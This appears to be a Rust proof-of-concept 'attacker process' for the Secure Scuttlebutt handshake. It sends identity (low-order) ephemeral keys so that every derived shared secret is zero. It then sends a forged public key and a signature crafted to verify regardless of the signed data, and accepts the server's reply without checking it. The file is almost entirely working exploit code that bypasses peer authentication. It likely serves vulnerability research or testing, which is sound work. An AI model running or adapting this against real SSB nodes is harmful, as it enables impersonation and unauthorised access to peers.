use core::mem;
use genio::{Read, Write};
use rand::{CryptoRng, RngCore};
use ssb_crypto::{Keypair, NetworkKey, PublicKey, Signature};
use ssb_crypto::ephemeral::{EphPublicKey, EphSecretKey, SharedSecret};
use ssb_handshake::HandshakeError;
use ssb_handshake::bytes;
use ssb_handshake::crypto::keys::{
    ClientEphPublicKey, ClientEphSecretKey, ClientPublicKey, ClientSignature,
};
use ssb_handshake::crypto::message::{
    ClientHello, ServerHello, ClientAuth, ClientAuthPayload, ServerAccept,
};
use ssb_handshake::crypto::shared_secret::{SharedA, SharedB, SharedC};
use ssb_handshake::sync::util::send;


/// Run the attacker process.
pub fn run<T>(
    mut channel: T,
) -> Result<(), HandshakeError<T::ReadError>>
where
    T: Read,
    T: Write<WriteError = T::ReadError, FlushError = T::ReadError>,
{
    let net_key = NetworkKey::SSB_MAIN_NET;

    let zero = [0; 32];

    let mut one = [0; 32];
    one[0] = 1;
    let one = one;

    let mut keypair = Keypair::from_slice(&[0; 64]).unwrap();
    keypair.public.0 = one;
    keypair.secret.0 = one;
    let keypair = keypair;

    let eph_kp = (
        EphPublicKey(one),
        EphSecretKey(one),
    );

    let (eph_pk, eph_sk) = (ClientEphPublicKey(eph_kp.0), ClientEphSecretKey(eph_kp.1));

    send(&mut channel, ClientHello::new(&eph_pk, &net_key))?;

    let server_eph_pk = {
        let mut buf = [0u8; mem::size_of::<ServerHello>()];
        channel.read_exact(&mut buf)?;
        bytes::as_mut::<ServerHello>(&mut buf)
            .verify(&net_key)
            .ok_or(HandshakeError::ServerHelloVerifyFailed)?
    };

    // Derive shared secrets
    //eprintln!("evil: (client) eph_sk = {}", eph_sk.0.0.as_bytes().encode_hex::<String>());
    //eprintln!("evil: (client) eph_pk = {}", eph_pk.0.0.as_bytes().encode_hex::<String>());
    //eprintln!("evil: server_eph_pk = {}", server_eph_pk.as_bytes().encode_hex::<String>());

    //let shared_a = SharedA::client_side(&eph_sk, &server_eph_pk).ok_or(SharedAInvalid)?;
    let shared_a = SharedA(SharedSecret(zero));
    //eprintln!("evil: shared a*b = {}", shared_a.as_bytes().encode_hex::<String>());

    //let shared_b = SharedB::client_side(&eph_sk, &server_pk).ok_or(SharedBInvalid)?;
    //eprintln!("evil: shared a*B is UNKNOWN");
    let shared_b = SharedB(SharedSecret(zero));
    //eprintln!("evil: shared a*B = {}", shared_b.as_bytes().encode_hex::<String>());

    //let shared_c = SharedC::client_side(&keypair, &server_eph_pk).ok_or(SharedCInvalid)?;
    let shared_c = SharedC(SharedSecret(zero));
    //eprintln!("evil: shared A*b = {}", shared_c.as_bytes().encode_hex::<String>());

    // At this point, we're supposed to send `ClientAuth` containing a public key and a signature
    // made with that public key over `server_pk` (and some other things).  We don't actually know
    // `server_pk`, so instead we send a fake public key and a signature that will verify under
    // that key regardless of the signed data.
    let mut fake_sig = Signature([0; 64]);
    fake_sig.0[..32].copy_from_slice(&one);
    fake_sig.0[32..].copy_from_slice(&zero);
    let fake_key = PublicKey(one);
    let payload = ClientAuthPayload(ClientSignature(fake_sig), ClientPublicKey(fake_key));
    let client_auth = ClientAuth::from_payload(payload, &net_key, &shared_a, &shared_b);
    // `client_auth.verify` should succeed regardless of keypair used.
    //assert!(client_auth.clone().verify(
    //        &Keypair::from_seed(&[0; 32]).unwrap(), net_key, &shared_a, &shared_b).is_some());
    //assert!(client_auth.clone().verify(
    //        &Keypair::from_seed(&[255; 32]).unwrap(), net_key, &shared_a, &shared_b).is_some());
    //assert!(client_auth.clone().verify(&keypair, net_key, &shared_a, &shared_b).is_some());
    // Send client auth
    send(&mut channel, client_auth)?;

    let mut buf = [0u8; mem::size_of::<ServerAccept>()];
    channel.read_exact(&mut buf)?;
    // We don't have the `server_pk` to verify the `ServerAccept` message, so just assume it's
    // valid.
    /*
    bytes::as_ref::<ServerAccept>(&buf)
        .verify(
            &keypair, &server_pk, &net_key, &shared_a, &shared_b, &shared_c,
        )
        .ok_or(ServerAcceptVerifyFailed)?;
        */

    Ok(())
}
